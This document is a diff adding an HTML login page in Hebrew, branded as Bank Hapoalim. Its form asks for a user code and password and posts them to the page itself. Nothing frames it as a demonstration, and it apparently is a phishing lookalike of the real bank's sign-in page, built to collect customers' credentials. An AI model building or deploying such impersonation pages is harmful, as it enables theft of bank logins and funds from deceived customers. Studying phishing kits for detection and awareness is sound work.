@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="he">
+<head>
+    <meta charset="UTF-8">
+    <title>בנק הפועלים - כניסה לחשבונך</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #e6a5a5 0%, #68c3bb 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: white;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            color: #333;
+            font-weight: bold;
+            font-size: 1.5rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: #333;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 8px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 400px;
+            margin: auto;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        .login-title {
+            text-align: center;
+            font-size: 1.75rem;
+            margin-bottom: 2rem;
+            color: #333;
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #333;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #f5f7fa;
+        }
+
+        .forgot-password {
+            color: #666;
+            text-decoration: underline;
+            display: block;
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 0.75rem;
+            background-color: #dc1c2e;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 1.1rem;
+        }
+
+        .login-button:hover {
+            background-color: #b91626;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">בנק הפועלים</div>
+        <nav class="nav-links">
+            <a href="#" class="nav-link">שירות ותמיכה</a>
+            <a href="#" class="nav-link">הגנה על החשבון שלי</a>
+            <a href="#" class="nav-link">טעויות נפוצות בכניסה לחשבון</a>
+        </nav>
+    </header>
+
+    <main>
+        <div class="login-container">
+            <h1 class="login-title">כניסה לחשבונך</h1>
+            <form method="POST">
+                <div class="input-group">
+                    <label>קוד משתמש</label>
+                    <input type="text" name="code" class="input-field" />
+                </div>
+                <div class="input-group">
+                    <label>סיסמה</label>
+                    <input type="password" name="password" class="input-field" />
+                </div>
+                <a href="#" class="forgot-password">שכחתי קוד משתמש / סיסמה</a>
+                <button type="submit" class="login-button">כניסה</button>
+            </form>
+        </div>
+    </main>
+</body>
+</html>
